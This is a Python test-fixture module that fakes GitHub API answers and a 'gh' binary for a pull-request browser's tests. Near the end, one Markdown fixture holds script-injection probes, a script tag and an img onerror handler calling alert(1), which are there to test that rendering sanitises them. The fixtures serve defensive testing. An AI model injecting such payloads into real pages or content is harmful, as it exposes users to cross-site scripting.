    "SKIPPED",
    "STALE",
    "STARTUP_FAILURE",
    "SUCCESS",
    "TIMED_OUT",
    "WAITING",
)
_STATUS_STATES: Final = ("EXPECTED", "ERROR", "FAILURE", "PENDING", "SUCCESS")
# What the stand-in's base branch requires, a rule only the status read sees: its tests and
# its docs build, and a review.
REQUIRED_CHECKS: Final = frozenset({"tests (3.13)", "docs"})
# The operational status of each pull request, as GitHub's merge verdict would give it
# under that rule: 7 waits on its docs build and a review, with auto-merge on; 8 was
# merged and 9 closed, which GitHub no longer judges; and 10, the draft, conflicts.
STATUS_SHAPES: Final[Mapping[int, Mapping[str, Any]]] = {
    7: {
        "mergeable": "MERGEABLE",
        "mergeStateStatus": "BLOCKED",
        "reviewDecision": "REVIEW_REQUIRED",
        "autoMergeRequest": {
            "mergeMethod": "SQUASH",
            "enabledAt": "2026-09-16T17:40:00Z",
            "enabledBy": {"login": "maintainer"},
        },
    },
    8: {"mergeable": "UNKNOWN", "mergeStateStatus": "UNKNOWN", "reviewDecision": "APPROVED"},
    9: {"mergeable": "UNKNOWN", "mergeStateStatus": "UNKNOWN", "reviewDecision": "REVIEW_REQUIRED"},
    10: {"mergeable": "CONFLICTING", "mergeStateStatus": "DIRTY", "reviewDecision": None},
}


def graph_status_data(
    parts: Mapping[str, Any],
    *,
    reader: str = READER,
    shape: Mapping[str, Any] | None = None,
) -> dict[str, Any]:
    """The status query's answer for one pull request, from its REST checks and status.

    Each check run and commit status the REST answers list is one context, required as
    :data:`REQUIRED_CHECKS` says, and GitHub's counts and rollup are taken from them, so
    the two reads agree. A head with neither has no rollup, as GitHub answers ``null``.
    *shape* is GitHub's verdict on it, :data:`STATUS_SHAPES`' for its number by default.
    """

    pull = parts["pull"]
    runs = parts["check_runs"]["check_runs"]
    statuses = (parts.get("status") or {}).get("statuses") or []
    nodes: list[dict[str, Any]] = []
    run_counts = dict.fromkeys(_CHECK_RUN_STATES, 0)
    status_counts = dict.fromkeys(_STATUS_STATES, 0)
    for minute, run in enumerate(runs):
        state = (run["conclusion"] if run["status"] == "completed" else run["status"]).upper()
        run_counts[state] += 1
        nodes.append(
            {
                "__typename": "CheckRun",
                "name": run["name"],
                "status": run["status"].upper(),
                "conclusion": run["conclusion"].upper() if run["conclusion"] else None,
                "isRequired": run["name"] in REQUIRED_CHECKS,
                "detailsUrl": run["details_url"],
                "startedAt": f"2026-09-16T17:{30 + minute:02d}:00Z",
                "checkSuite": {
                    "app": {"name": run["app"]["name"]},
                    # An Actions run's workflow and event, which tell its reruns apart.
                    "workflowRun": {"event": "pull_request", "workflow": {"name": "CI"}}
                    if run["app"]["name"] == "GitHub Actions"
                    else None,
                },
            }
        )
    for status in statuses:
        status_counts[status["state"].upper()] += 1
        nodes.append(
            {
                "__typename": "StatusContext",
                "context": status["context"],
                "state": status["state"].upper(),
                "isRequired": status["context"] in REQUIRED_CHECKS,
                "targetUrl": status["target_url"],
                "description": status["description"],
            }
        )
    states = {state for state, count in (*run_counts.items(), *status_counts.items()) if count}
    rollup = None
    if nodes:
        rollup = {
            "state": "FAILURE"
            if states & {"FAILURE", "ERROR", "CANCELLED", "TIMED_OUT", "ACTION_REQUIRED"}
            else "PENDING"
            if states - {"SUCCESS", "SKIPPED", "NEUTRAL"}
            else "SUCCESS",
            "contexts": {
                "pageInfo": {"hasNextPage": False, "endCursor": "MTA"},
                "checkRunCountsByState": [
                    {"state": state, "count": count} for state, count in run_counts.items()
                ],
                "statusContextCountsByState": [
                    {"state": state, "count": count} for state, count in status_counts.items()
                ],
                "nodes": nodes,
            },
        }
    shape = STATUS_SHAPES[pull["number"]] if shape is None else shape
    return {
        "viewer": {"login": reader},
        "rateLimit": {"cost": 1},
        "repository": {
            "id": "R_demo",
            "nameWithOwner": "octo/demo",
            "pull": {
                "number": pull["number"],
                "headRefOid": pull["head"]["sha"],
                "baseRefName": pull["base"]["ref"],
                "baseRefOid": pull["base"]["sha"],
                "isDraft": pull.get("draft", False),
                "mergeable": shape["mergeable"],
                "mergeStateStatus": shape["mergeStateStatus"],
                "reviewDecision": shape["reviewDecision"],
                "isInMergeQueue": False,
                "mergeQueueEntry": None,
                "autoMergeRequest": shape.get("autoMergeRequest"),
                "statusCheckRollup": rollup,
            },
        },
    }


# Three pull requests' status answers as GitHub gave them on 2026-11-26 to this query, each
# beside what ``gh pr checks`` 2.97.0 listed of the same head (name, bucket, workflow,
# event), trimmed to the fields a status keeps, with the viewer the stand-in's reader. Each
# is BLOCKED: psf/requests#7619 waits on a review, with two failing ``lint`` runs of one
# workflow that a push and a pull request each ran, neither required; kubernetes/
# enhancements#6506 is approved, every required check passing and only ``tide`` pending; and
# python/cpython#162697 fails two required checks, one of them run four times.
LIVE_STATUS_ANSWERS: Final = Path(__file__).parent / "fixtures" / "github-status-answers.json"


@dataclass(frozen=True)
class LiveStatusAnswer:
    """One recorded answer (:data:`LIVE_STATUS_ANSWERS`): the pull request, the status
    query's answer to it, and the checks ``gh pr checks`` listed of it."""

    owner: str
    repo: str
    number: int
    data: dict[str, Any]
    gh_pr_checks: tuple[tuple[str, str, str, str], ...]

    @property
    def name(self) -> str:
        return f"{self.owner}/{self.repo}#{self.number}"


def live_status_answers() -> list[LiveStatusAnswer]:
    """The recorded answers of :data:`LIVE_STATUS_ANSWERS`, each as the query's ``data``."""

    answers: list[LiveStatusAnswer] = []
    for entry in json.loads(LIVE_STATUS_ANSWERS.read_text(encoding="utf-8")):
        slug, number = entry["pull"].split("#")
        owner, repo = slug.split("/")
        rollup = {
            "state": entry["rollup"],
            "contexts": {
                "pageInfo": entry["pageInfo"],
                "checkRunCountsByState": entry["checkRunCountsByState"],
                "statusContextCountsByState": entry["statusContextCountsByState"],
                "nodes": entry["nodes"],
            },
        }
        data = {
            "viewer": {"login": READER},
            "rateLimit": {"cost": 1},
            "repository": {
                **entry["repository"],
                "pull": {**entry["fields"], "statusCheckRollup": rollup},
            },
        }
        listed = tuple(
            (name, bucket, workflow, event)
            for name, bucket, workflow, event in entry["gh_pr_checks"]
        )
        answers.append(LiveStatusAnswer(owner, repo, int(number), data, listed))
    return answers


def graph_status_entry(
    parts: Mapping[str, Any], *, reader: str = READER, shape: Mapping[str, Any] | None = None
) -> dict[str, Any]:
    """The fake-gh entry for one pull request's status query, its first page."""

    path = f"graphql:status:{parts['pull']['number']}:start"
    return ok(path, {"data": graph_status_data(parts, reader=reader, shape=shape)})


# The open pull requests one page of the status scan holds (``SCAN_ROWS``).
STATUS_SCAN_ROWS: Final = 25


def scan_rollup(parts: Mapping[str, Any]) -> dict[str, Any] | None:
    """The rollup the status scan reads for one pull request: the page's read's, as
    :func:`graph_status_data` builds it from its checks, with its counts and no check."""

    rollup = graph_status_data(parts)["repository"]["pull"]["statusCheckRollup"]
    if rollup is None:
        return None
    contexts = rollup["contexts"]
    return {
        "state": rollup["state"],
        "contexts": {
            "checkRunCountsByState": contexts["checkRunCountsByState"],
            "statusContextCountsByState": contexts["statusContextCountsByState"],
        },
    }


def scan_node(
    item: Mapping[str, Any],
    *,
    rollup: Mapping[str, Any] | None = None,
    shape: Mapping[str, Any] | None = None,
) -> dict[str, Any]:
    """One open pull request as the status scan's page holds it; *shape* is GitHub's
    verdict, :data:`STATUS_SHAPES`' for its number, or a clean one, by default."""

    shape = STATUS_SHAPES.get(item["number"], {}) if shape is None else shape
    return {
        "number": item["number"],
        "headRefOid": item["head"]["sha"],
        "baseRefName": item["base"]["ref"],
        "baseRefOid": item["base"].get("sha"),
        "mergeable": shape.get("mergeable", "MERGEABLE"),
        "mergeStateStatus": shape.get("mergeStateStatus", "CLEAN"),
        "reviewDecision": shape.get("reviewDecision"),
        "isInMergeQueue": shape.get("isInMergeQueue", False),
        "mergeQueueEntry": shape.get("mergeQueueEntry"),
        "autoMergeRequest": shape.get("autoMergeRequest"),
        "statusCheckRollup": rollup,
    }


def statuses_entries(
    nodes: list[dict[str, Any]], *, updated_at: Mapping[int, str], reader: str = READER
) -> dict[str, Any]:
    """The status scan's pages of *nodes*, graphql:statuses:<cursor|start>, last updated
    first as GitHub orders them by ``UPDATED_AT``: by *updated_at*, each number's time."""

    entries: dict[str, Any] = {}
    ordered = sorted(
        nodes, key=lambda node: (updated_at[node["number"]], node["number"]), reverse=True
    )
    for offset in range(0, max(1, len(ordered)), STATUS_SCAN_ROWS):
        cursor = f"statuses-{offset}" if offset else "start"
        batch = ordered[offset : offset + STATUS_SCAN_ROWS]
        key = f"graphql:statuses:{cursor}"
        more = offset + STATUS_SCAN_ROWS < len(ordered)
        body = {
            "data": {
                "viewer": {"login": reader},
                "rateLimit": {"cost": 1},
                "repository": {
                    "id": "R_demo",
                    "nameWithOwner": "octo/demo",
                    "pullRequests": {
                        "pageInfo": {
                            "hasNextPage": more,
                            "endCursor": f"statuses-{offset + len(batch)}" if batch else None,
                        },
                        "nodes": batch,
                    },
                },
            }
        }
        entries[key] = ok(key, body)
    return entries


def api_entries(origin: Origin) -> dict[str, Any]:
    """Every ``gh api`` path of pull requests 7 to 10 and its recorded answer."""

    base = "repos/octo/demo"
    entries: dict[str, Any] = {}
    for number, parts in pull_bodies(origin).items():
        head = parts["pull"]["head"]["sha"]
        paths = {
            f"{base}/pulls/{number}": parts["pull"],
            page(f"{base}/issues/{number}/comments"): parts["issue_comments"],
            page(f"{base}/pulls/{number}/reviews"): parts["reviews"],
            page(f"{base}/pulls/{number}/comments"): parts["review_comments"],
            page(f"{base}/commits/{head}/check-runs"): parts["check_runs"],
            page(f"{base}/commits/{head}/status"): parts["status"],
        }
        for path, body in paths.items():
            entries[path] = ok(path, body)
        entries[f"graphql:core:{number}"] = graph_core_entry(parts["pull"])
        entries[f"graphql:status:{number}:start"] = graph_status_entry(parts)
    return entries


def list_page(state: str, number: int = 1) -> str:
    """The ``gh api`` path of one full-size page of a repository's list."""

    query = f"state={state}&sort=created&direction=desc&per_page=100&page={number}"
    return f"repos/octo/demo/pulls?{query}"


def next_link(path: str, number: int) -> dict[str, str]:
    """The ``Link`` header of a page GitHub has another page after."""

    return {"Link": f'<https://api.github.com/{path}?page={number + 1}>; rel="next"'}


@functools.cache
def _recorded_list_item() -> dict[str, Any]:
    return recorded_responses()["list_item"]


def list_item(pull: Mapping[str, Any]) -> dict[str, Any]:
    """*pull* as a list's item carries it: every key of the real item, with its values."""

    item = _recorded_list_item()
    number = pull["number"]
    links = {
        key: value.replace("/7", f"/{number}")
        for key, value in item.items()
        if key == "url" or (key.endswith("_url") and key != "review_comment_url")
    }
    labels = [{**item["labels"][0], **label} for label in pull["labels"]]
    copied = (
        "number",
        "state",
        "title",
        "user",
        "body",
        "created_at",
        "updated_at",
        "closed_at",
        "merged_at",
        "merge_commit_sha",
        "head",
        "base",
        "draft",
    )
    return {**item, **links, **{key: pull[key] for key in copied}, "labels": labels}


def generated_item(number: int) -> dict[str, Any]:
    """A pull request that only lists hold, newer the higher its *number*."""

    when = (FETCHED_AT.replace(hour=8) + timedelta(minutes=number)).strftime("%Y-%m-%dT%H:%M:%SZ")
    side = {"repo": {"full_name": "octo/demo"}}
    return list_item(
        {
            "number": number,
            "state": "open",
            "title": f"Work item {number}",
            "user": {"login": "contributor"},
            "body": f"The description of work item {number}.",
            "created_at": when,
            "updated_at": when,
            "closed_at": None,
            "merged_at": None,
            "merge_commit_sha": None,
            "head": {"ref": f"work-{number}", "sha": "0" * 40, **side},
            "base": {"ref": DEFAULT_BRANCH, "sha": "0" * 40, **side},
            "draft": False,
            "labels": [],
        }
    )


def head_item(
    number: int,
    head: str,
    title: str,
    *,
    state: str = "open",
    draft: bool = False,
    merged: bool = False,
    head_repository: str | None = "octo/demo",
) -> dict[str, Any]:
    """A pull request from branch *head* of *head_repository*, as the ref chooser lists it.

    Its repository is the demo's own by default, so its branch is the repository's; a fork
    names another, and a deleted fork none.
    """

    item = generated_item(number)
    item["title"] = title
    item["state"] = state
    item["draft"] = draft
    item["head"] = {
        "ref": head,
        "sha": "0" * 40,
        "repo": {"full_name": head_repository} if head_repository is not None else None,
    }
    if state == "closed":
        item["closed_at"] = item["updated_at"]
    if merged:
        item["merged_at"] = item["updated_at"]
    return item


def list_entries(origin: Origin) -> dict[str, Any]:
    """Every ``gh api`` path of the repository's lists and its answer."""

    known = {number: list_item(parts["pull"]) for number, parts in pull_bodies(origin).items()}
    first_page = [
        *(generated_item(number) for number in range(106, 10, -1)),
        *(known[number] for number in (10, 9, 8, 7)),
    ]
    pages: list[tuple[str, list[dict[str, Any]], Mapping[str, str] | None]] = [
        (list_page("all"), first_page, next_link("repos/octo/demo/pulls", 1)),
        (list_page("all", 2), [generated_item(6), generated_item(5)], None),
        (list_page("open"), [known[10], known[7]], None),
        (list_page("closed"), [known[9], known[8]], None),
    ]
    return {path: ok(path, body, headers) for path, body, headers in pages}


# ── Changed files ───────────────────────────────────────────────

# Pull request 106's files: a chain of single-child folders, ``src/app``, that
# splits below; a rename inside a folder and one across folders; a deleted file; a binary
# file, which GitHub counts as no lines; a name with a control character and one with a
# zero-width space, which the display rule replaces; and enough of one folder's files to
# fill three pages, the last of them short.
_TREE_FILES: Final[tuple[tuple[str, str, str | None, int, int], ...]] = (
    ("README.md", "modified", None, 2, 1),
    ("assets/logo.png", "modified", None, 0, 0),
    ("docs/guide.md", "renamed", "docs/old-guide.md", 3, 0),
    ("docs/removed.md", "removed", None, 0, 12),
    *(
        (f"src/app/plugins/github/mod_{index:03d}.py", "modified", None, 4, 2)
        for index in range(239)
    ),
    ("src/app/plugins/github/pull_files.py", "added", None, 120, 0),
    ("src/app/views/one.py", "modified", None, 1, 1),
    ("src/app/views/two.py", "added", None, 9, 0),
    ("tools/new/script.sh", "renamed", "scripts/script.sh", 0, 0),
    ("weird/bell\u0007name.txt", "added", None, 1, 0),
    ("weird/zero\u200bwidth.md", "modified", None, 1, 1),
)
# The pull request GitHub stops listing at its limit: 3,000 files on 30 full pages.
CAPPED_PULL: Final = 105
TREE_PULL: Final = 106


def files_page(number: int, page_number: int = 1) -> str:
    """The ``gh api`` path of one full-size page of a pull request's changed files."""

    return f"repos/octo/demo/pulls/{number}/files?per_page=100&page={page_number}"


def files_link(number: int, page_number: int, last: int) -> dict[str, str]:
    """The ``Link`` header of a page of changed files that has another after it."""

    base = f"https://api.github.com/repositories/1/pulls/{number}/files?per_page=100"
    return {
        "Link": f'<{base}&page={page_number + 1}>; rel="next", <{base}&page={last}>; rel="last"'
    }


@functools.cache
def _recorded_file_item() -> dict[str, Any]:
    return recorded_responses()["file_item"]


def file_item(
    path: str,
    status: str = "modified",
    previous: str | None = None,
    additions: int = 1,
    deletions: int = 0,
) -> dict[str, Any]:
    """*path* as GitHub's list of changed files carries it: every key of the real item."""

    item = {
        key: value for key, value in _recorded_file_item().items() if key != "previous_filename"
    }
    links = {
        key: item[key].replace("docs/guide.md", path)
        for key in ("blob_url", "raw_url", "contents_url")
    }
    fields = {"filename": path, "status": status, "additions": additions, "deletions": deletions}
    renamed = {"previous_filename": previous} if previous is not None else {}
    return {**item, **links, **fields, "changes": additions + deletions, **renamed}


def tree_files() -> list[dict[str, Any]]:
    """Pull request 106's changed files, in GitHub's order, which is by path."""

    rows = sorted(_TREE_FILES, key=lambda row: row[0])
    return [
        file_item(path, status, previous, adds, dels) for path, status, previous, adds, dels in rows
    ]


def file_pages(number: int, items: list[dict[str, Any]]) -> dict[str, Any]:
    """*items* as GitHub's full-size pages, each with its ``Link``, keyed by ``gh api`` path.

    The last page names no next page, which at 3,000 files is GitHub's own end: the
    thirtieth page is full and names none, as nodejs/node#65161's did.
    """

    chunks = [items[start : start + 100] for start in range(0, len(items), 100)] or [[]]
    last = len(chunks)
    entries: dict[str, Any] = {}
    for index, chunk in enumerate(chunks, start=1):
        path = files_page(number, index)
        entries[path] = ok(path, chunk, files_link(number, index, last) if index < last else None)
    return entries


def file_entries() -> dict[str, Any]:
    """Every ``gh api`` path of changed files the stand-in answers."""

    capped = [file_item(f"gen/part{index // 100:02d}/file{index:04d}.txt") for index in range(3000)]
    return {
        **file_pages(
            7,
            [
                file_item("docs/new.md", "added", None, 1, 0),
                file_item("src/app.txt", "modified", None, 1, 0),
            ],
        ),
        **file_pages(TREE_PULL, tree_files()),
        **file_pages(CAPPED_PULL, capped),
    }


def files_scenario(origin: Origin) -> dict[str, Any]:
    """:func:`scenario`, answering the changed files too, which only their tests read."""

    answers = scenario(origin)
    return {**answers, "api": {**answers["api"], **file_entries()}}


def account(login: str = READER, *, state: str = "success") -> dict[str, Any]:
    """A ``gh auth status --json hosts`` answer for one active github.com account."""

    host = {
        "state": state,
        "active": True,
        "host": "github.com",
        "login": login,
        "tokenSource": "keyring",
        "scopes": "repo",
        "gitProtocol": "https",
    }
    return {"stdout": json.dumps({"hosts": {"github.com": [host]}}) + "\n", "exit": 0}


LIST_PROBE_PATH = "repos/octo/demo/issues?state=all&sort=updated&direction=desc&per_page=1"
NEWEST_PULL_PATH = "repos/octo/demo/pulls?state=all&sort=updated&direction=desc&per_page=1"


def catalog_entries(
    items: list[dict[str, Any]], *, reader: str = READER, repository_id: str = "R_demo"
) -> dict[str, Any]:
    """Fixed GraphQL pages for creation backfill, activity prefixes and deltas."""
    totals = {"all": len(items), "open": sum(item["state"] == "open" for item in items)}
    totals["closed"] = totals["all"] - totals["open"]
    latest = max((item["updated_at"] for item in items), default=None)
    entries: dict[str, Any] = {}
    for name in ("all", "open", "closed", "activity", "updated"):
        selected = [
            item for item in items if name not in {"open", "closed"} or item["state"] == name
        ]
        selected.sort(
            key=lambda item: (
                item["created_at" if name == "all" else "updated_at"],
                item["number"],
            ),
            reverse=True,
        )
        # Keep All's cursor format in existing assertions. Its fixture page key still
        # distinguishes the order of the priority scan from that of the backfill.
        cursor_name = "all" if name == "activity" else name
        prefix_head = (
            [{"number": selected[0]["number"], "updatedAt": selected[0]["updated_at"]}]
            if selected
            else []
        )
        for offset in range(0, max(1, len(selected)), 100):
            cursor = f"{cursor_name}-{offset}" if offset else "start"
            batch = selected[offset : offset + 100]
            nodes = []
            for item in batch:
                head = item["head"].get("repo")
                nodes.append(
                    {
                        "number": item["number"],
                        "title": item["title"],
                        "state": "MERGED" if item.get("merged_at") else item["state"].upper(),
                        "isDraft": item.get("draft", False),
                        "mergedAt": item.get("merged_at"),
                        "createdAt": item["created_at"],
                        "updatedAt": item["updated_at"],
                        "closedAt": item.get("closed_at"),
                        "author": item.get("user"),
                        "baseRefName": item["base"]["ref"],
                        "headRefName": item["head"]["ref"],
                        "headRefOid": item["head"]["sha"],
                        "headRepository": {"nameWithOwner": head["full_name"]} if head else None,
                        "labels": {
                            "nodes": [
                                {"name": label["name"]} for label in item.get("labels", [])[:100]
                            ],
                            "pageInfo": {"hasNextPage": len(item.get("labels", [])) > 100},
                        },
                    }
                )
            key = f"graphql:{name}:{cursor}"
            body = {
                "data": {
                    "viewer": {"login": reader},
                    "repository": {
                        "id": repository_id,
                        **{label: {"totalCount": count} for label, count in totals.items()},
                        "latest": {"nodes": [{"updatedAt": latest}] if latest else []},
                        "prefixHead": {"nodes": prefix_head},
                        "page": {
                            "nodes": nodes,
                            "pageInfo": {
                                "hasNextPage": offset + 100 < len(selected),
                                "endCursor": f"{cursor_name}-{offset + len(batch)}"
                                if batch
                                else None,
                            },
                        },
                    },
                }
            }
            entries[key] = ok(key, body)
    # The list probe's one-row page: the pull request updated last, as the issues list
    # names it, and the pulls page asked when an issue is newest.
    newest = max(items, key=lambda item: (item["updated_at"], item["number"]), default=None)
    as_issue = (
        []
        if newest is None
        else [
            {
                "number": newest["number"],
                "updated_at": newest["updated_at"],
                "pull_request": {
                    "url": f"https://api.github.com/repos/octo/demo/pulls/{newest['number']}"
                },
            }
        ]
    )
    entries[LIST_PROBE_PATH] = ok(LIST_PROBE_PATH, as_issue)
    entries[NEWEST_PULL_PATH] = ok(NEWEST_PULL_PATH, [newest] if newest is not None else [])
    # The status scan of the same open pull requests, each rolled up as its own page's read
    # rolls up its checks, so a scan and a read of one head agree.
    rollups = scan_rollups()
    nodes = [
        scan_node(item, rollup=rollups.get(item["number"]))
        for item in items
        if item["state"] == "open"
    ]
    updated_at = {item["number"]: item["updated_at"] for item in items}
    entries.update(statuses_entries(nodes, updated_at=updated_at, reader=reader))
    return entries


def scan_rollups() -> dict[int, dict[str, Any] | None]:
    """What the status scan reads of each of pull requests 7 to 10's checks: the rollup of
    the checks :func:`pull_bodies` gives them, which no commit of the origin changes."""

    if not _SCAN_ROLLUPS:
        placeholder = Origin(Path("."), defaultdict(lambda: "0" * 40))
        _SCAN_ROLLUPS.update(
            {number: scan_rollup(parts) for number, parts in pull_bodies(placeholder).items()}
        )
    return dict(_SCAN_ROLLUPS)


_SCAN_ROLLUPS: dict[int, dict[str, Any] | None] = {}


def make_released_catalog(repository: ListedRepository, **updates: object) -> None:
    """Restore the released schema-1 catalog: creation-ordered, v1 cursors, no status.

    *updates* replace checkpoint fields as that release wrote them.
    """
    import sqlite3

    path = repository.home / f"sources/{repository.slug}/pulls/catalog.sqlite3"
    with contextlib.closing(sqlite3.connect(path)) as db, db:
        db.execute("DROP TABLE pull_status")
        db.execute("DROP INDEX pulls_updated_number")
        db.execute("DROP INDEX pulls_state_updated_number")
        db.execute("CREATE INDEX pulls_state_number ON pulls(state, number DESC)")
        db.execute("PRAGMA user_version=1")
        (value,) = db.execute("SELECT value FROM checkpoint").fetchone()
        checkpoint = json.loads(value) | {"schema_version": 1} | updates
        del checkpoint["backfill_cursor"]
        del checkpoint["prefix_heads"]
        db.execute("UPDATE checkpoint SET value=?", (json.dumps(checkpoint),))


def seed_catalog(
    repository: ListedRepository,
    items: list[dict[str, Any]],
    *,
    reader: str = READER,
    fetched_at: str = "2026-10-01T12:00:00Z",
    complete: bool = True,
    repository_id: str = "R_demo",
) -> CatalogState:
    """Seed actual bounded catalog publications without a fake route envelope."""
    from metabrowser.builtin_plugins.github.pull_catalog import (
        CATALOG_PROJECTION,
        CatalogState,
        publish_page,
        read_catalog,
    )
    from metabrowser.builtin_plugins.github.pull_list_refresh import (
        _row,  # pyright: ignore[reportPrivateUsage]
    )

    totals = {"all": len(items), "open": sum(item["state"] == "open" for item in items)}
    totals["closed"] = totals["all"] - totals["open"]
    state = read_catalog(repository.home, repository.slug)
    ordered = sorted(items, key=lambda item: item["number"], reverse=True)
    for offset in range(0, max(1, len(ordered)), 100):
        proposed = CatalogState(
            projection_version=CATALOG_PROJECTION,
            source=repository.source,
            repository_id=repository_id,
            reader=f"gh:{reader}",
            fetched_at=fetched_at,
            count_at=fetched_at,
            totals=totals,
            covered={name: min(offset + 100, totals[name]) for name in totals},
            done={name: complete and offset + 100 >= len(ordered) for name in totals},
            watermark=max((item["updated_at"] for item in items), default=None),
        )
        if (
            state is not None
            and state.reader == proposed.reader
            and state.repository_id == repository_id
        ):
            proposed = proposed.model_copy(update={"epoch": state.epoch})
        rows = tuple(_row(item)[0] for item in ordered[offset : offset + 100])
        assert publish_page(repository, state, proposed, rows)
        state = read_catalog(repository.home, repository.slug)
    assert state is not None
    return state


def label_entries() -> dict[str, Any]:
    """The repository's label set, one page: GitHub's three labels the stand-in's pulls use.

    Each is the recorded list item's label, with its own name, color, and description.
    """

    template = recorded_responses()["list_item"]["labels"][0]
    labels = [
        template,
        {
            **template,
            "id": 3581582504,
            "name": "invalid",
            "url": "https://api.github.com/repos/octo/demo/labels/invalid",
            "color": "e4e669",
            "description": None,
        },
        {
            **template,
            "id": 3581582505,
            "name": "bug",
            "url": "https://api.github.com/repos/octo/demo/labels/bug",
            "color": "d73a4a",
            "description": "Something isn't working",
        },
    ]
    path = "repos/octo/demo/labels?per_page=100&page=1"
    return {path: ok(path, labels)}


def scenario(origin: Origin) -> dict[str, Any]:
    """Signed in as :data:`READER`, answering every read of pull requests 7 to 10."""

    lists = list_entries(origin)
    items = [*lists[list_page("all")]["body"], *lists[list_page("all", 2)]["body"]]
    answers = {**api_entries(origin), **lists, **catalog_entries(items), **label_entries()}
    return {"auth": account(), "api": answers, "api_failure": None}


def install_fake_gh(directory: Path, answers: Mapping[str, Any]) -> dict[str, str]:
    """Write a ``gh`` replaying *answers*; return the environment that puts it first."""

    bin_dir = directory / "fake-gh-bin"
    bin_dir.mkdir(parents=True, exist_ok=True)
    gh = bin_dir / "gh"
    gh.write_text(_FAKE_GH.format(python=sys.executable), encoding="utf-8")
    gh.chmod(0o755)
    scenario_path = directory / "fake-gh-scenario.json"
    scenario_path.write_text(json.dumps(answers), encoding="utf-8")
    state = directory / "fake-gh-state.json"
    state.unlink(missing_ok=True)
    return {
        "PATH": f"{bin_dir}{os.pathsep}{os.environ.get('PATH', '')}",
        "FAKE_GH_SCENARIO": str(scenario_path),
        "FAKE_GH_STATE": str(state),
        "FAKE_GH_LOG": str(directory / "fake-gh-log.jsonl"),
    }


@contextlib.contextmanager
def _patched(target: object, name: str, value: object) -> Generator[None]:
    original = getattr(target, name)
    setattr(target, name, value)
    try:
        yield
    finally:
        setattr(target, name, original)


def build_home(
    directory: Path,
    *,
    files: bool = False,
    guided: bool = False,
    documents: bool = False,
    large: bool = False,
    stack_guide: bool = False,
) -> None:
    """Cache the mirror and pull requests 7 to 10 through the production CLI path.

    With *files*, :func:`build_file_lists` adds lists of changed files.
    With *guided*, the fake GitHub serves guides against known fixture comparisons; with
    *documents* too, pull request 7 also adds a YAML file, and its guide ends on a step that
    cites it and a Markdown file whole. With *large* as well, it adds a Markdown file whose
    whole patch charges past a step's budget for whole files, which that step cites too
    (:data:`_DOCUMENT_FILES`). With *stack_guide*, 10's description also carries the guide
    of a native stack whose top it is (:data:`_STACK_GUIDE_ITEMS`).

    The seams are the in-process goldens' own: the origin URL, the Git floor (the
    machine's Git may be below it), the clock, and a fake ``gh`` first on ``PATH``.
    Only this module run as a script reaches them, from a tryscript golden. No pytest
    run does, so the admitted-git job's tests still meet the floor unpatched.
    """

    from metabrowser.builtin_plugins.github import pull_list, pulls
    from metabrowser.cache import acquire
    from metabrowser.cache.urls import GitSource
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]
    from metabrowser.git.process import detect_git_version

    kept = ("config/settings.yaml", "docs/large.md") if large else ("config/settings.yaml",)
    more = {path: _DOCUMENT_FILES[path] for path in kept} if documents else None
    origin = build_origin(directory, more=more)
    answers = scenario(origin)
    if guided:
        _add_guides(origin, answers, documents=kept if documents else ())
    if stack_guide:
        _add_stack_guide(origin, answers)
    environment = install_fake_gh(directory, answers)
    version, _raw = detect_git_version()
    local = origin.url

    def remote_url_for(source: GitSource) -> str:
        return local if source.normalized == CANONICAL else source.normalized

    os.environ.update(environment)
    os.environ["METABROWSER_CACHE_DIR"] = str(directory / "home")
    os.environ["METABROWSER_LOG_LEVEL"] = "ERROR"
    with (
        _patched(acquire, "remote_url_for", remote_url_for),
        _patched(acquire, "require_acquisition_git", lambda: version),
        _patched(pulls, "utc_now", lambda: FETCHED_AT),
        _patched(pulls, "monotonic_ns", count(0, 425_000_000).__next__),
        _patched(pull_list, "utc_now", lambda: FETCHED_AT),
    ):
        for number in (7, 8, 9, 10):
            try:
                _run_cli([f"{CANONICAL}/pull/{number}", "--no-serve"])
            except SystemExit as exc:
                if exc.code not in (0, None):
                    raise
        build_lists(directory, answers)
        if files:
            build_file_lists(directory, answers)
    write_damaged_records(directory / "home")
    (directory / "root").mkdir(exist_ok=True)


def guide_body(origin: Origin) -> str:
    """An author-written description for the stand-in pull request 7."""
    return _guide_body(
        origin["base"], origin["fork_head"], _COUNT_STEP + _DOCS_STEP + _MORE_DOCS_REFERENCES
    )


def _guide_body(merge_base: str, head: str, items: str) -> str:
    """A description that introduces a guide pinned to *merge_base* and *head*, whose
    `items` are the YAML lines *items*."""
    return f"""The app learns to count to two. Its count and its explanation live in separate
files.

```guided-review
softschema:
  contract: metabrowser.collection:Collection/v1
  envelope: collection
  status: enforced
collection:
  comparison:
    merge_base: "{merge_base}"
    head: "{head}"
  items:
{items}```
"""


# The stand-in guide's two steps, entries at the top of `items`, which `_in_group` indents
# into a group.
_COUNT_STEP = """\
    - title: Start with the count
      note: Check that the original value is preserved.
      references:
        - {path: src/app.txt, side: new, start_line: 1, end_line: 2}
"""
_DOCS_STEP = """\
    - title: Read the new guide
      note: Check the new docs against the behavior.
      references:
        - {path: docs/new.md, side: new, start_line: 1, end_line: 1}
"""
# The second step's references after its first, as guide_body cites them.
_MORE_DOCS_REFERENCES = """\
        - {path: src/app.txt}
        - {path: missing.txt}
        - {path: src/app.txt, side: old, start_line: 2, end_line: 4}
"""


def _in_group(step: str) -> str:
    return "".join(f"    {line}\n" for line in step.splitlines())


# Two more steps over the stand-in's changes, so each group of a longer guide can hold two:
# the count's old side, and each changed file whole.
_OLD_COUNT_STEP = """\
    - title: Compare the old count
      note: Check what the count replaced.
      references:
        - {path: src/app.txt, side: old, start_line: 1, end_line: 1}
"""
_WHOLE_STEP = """\
    - title: Read each file whole
      note: Check the two changes together.
      references:
        - {path: src/app.txt}
        - {path: docs/new.md}
"""
# The count's step with Markdown in its note, which renders as the description does: two
# lines that join, a list with no blank line before it, a relative link, raw HTML, a
# script, an image whose source is not a URL, and an image over https. Its title is markup
# too, which stays text.
_MARKDOWN_STEP = """\
    - title: Start with the <b>count</b>
      note: |-
        Check that the **original** value
        is preserved:
        - `one` stays,
        - and [the guide](docs/new.md) says so.

        Raw <b>bold</b><script>alert(1)</script> <img src=x onerror=alert(1)> ![chart](https://example.com/chart.png)
      references:
        - {path: src/app.txt, side: new, start_line: 1, end_line: 2}
"""

# The count's step with a note KPress takes seconds to render, 100 unpaired `[` before
# 60 KiB of `%` (SLOW in tests/test_inert_render_deadline.py), which a deadline shortened
# through METABROWSER_INERT_RENDER_DEADLINE_MS refuses on any machine.
